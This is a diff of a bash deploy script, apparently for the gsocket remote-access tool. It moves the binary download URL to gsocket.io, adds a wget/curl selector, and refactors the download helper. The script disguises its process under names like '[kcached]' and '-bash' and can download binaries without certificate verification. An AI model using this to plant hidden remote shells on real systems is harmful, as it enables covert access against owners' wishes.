@@ -45,11 +45,14 @@
 #		- Specify custom installation directory
 # GS_HIDDEN_NAME="-bash"
 #       - Specify custom hidden name for process
+# GS_DL=wget
+#       - Command to use for download. =wget or =curl
 # TMPDIR=
 #       - Guess what...
 
 # Global Defines
-URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
+# URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
+URL_BASE="https://gsocket.io/bin/"
 [[ -n "$GS_URL_BASE" ]] && URL_BASE="$GS_URL_BASE" # Use user supplied URL_BASE
 URL_DEPLOY="gsocket.io/x"
 # GS_VERSION=1.4.34
@@ -69,10 +72,6 @@ PROC_HIDDEN_NAME_DEFAULT="[kcached]"
 	CN="\033[0m"    # none
 	CW="\033[1;37m"
 }
-
-# arr=()
-# arr+=("-r" "/etc/foobar.txt")
-# echo touch "${arr[@]}"
 
 if [[ -z "$GS_DEBUG" ]]; then
 	DEBUGF(){ :;}
@@ -1128,9 +1127,15 @@ ask_nocertcheck()
 # <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
 dl_ssl()
 {
+	local cmd sslerr arg_nossl
+	cmd="$3"
+	sslerr="$2"
+	arg_nossl="$1"
+
+	shift 3
 	if [[ -z $GS_NOCERTCHECK ]]; then
-		DL_LOG=$("$3" "$4" "$5" "$6" "$7" 2>&1)
-		[[ "${DL_LOG}" != *"$2"* ]] && return
+		DL_LOG=$("$cmd" "$@" 2>&1)
+		[[ "${DL_LOG}" != *"$sslerr"* ]] && return
 	fi
 
 	if [[ -z $GS_NOCERTCHECK ]]; then
@@ -1140,12 +1145,13 @@ dl_ssl()
 	[[ -z $GS_NOCERTCHECK ]] && return
 
 	echo -en "Downloading binaries without certificate verification................."
-	DL_LOG=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
+	DL_LOG=$("$cmd" "$arg_nossl" "$@" 2>&1)
 }
 
 # Download $1 and save it to $2
 dl()
 {
+	local arr
 	[[ -s "$2" ]] && return
 
 	# Need to set DL_CMD before GS_DEBUG check for proper error output
@@ -1162,6 +1168,9 @@ dl()
 		errexit
 	fi
 
+	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
+	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
+
 	# Debugging / testing. Use local package if available
 	if [[ -n "$GS_USELOCAL" ]]; then
 		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
@@ -1174,9 +1183,12 @@ dl()
 
 	# HERE: It's either wget or curl (but not GS_USELOCAL)
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
-		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
+		arr=("-fL" "-m5" "--retry" "3" "${URL_BASE}/${1}" "--output" "${2}")
+		[[ -n $GS_DEBUG ]] && arr+=("-v")
+		dl_ssl "-k" "certificate problem" "curl" "${arr[@]}"
 	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
-		dl_ssl "--no-check-certificate" "is not trusted" "wget" "" "${URL_BASE}/${1}" "-O" "${2}"
+		arr=("${URL_BASE}/${1}" "-O" "${2}")
+		dl_ssl "--no-check-certificate" "is not trusted" "wget" "${arr[@]}"
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
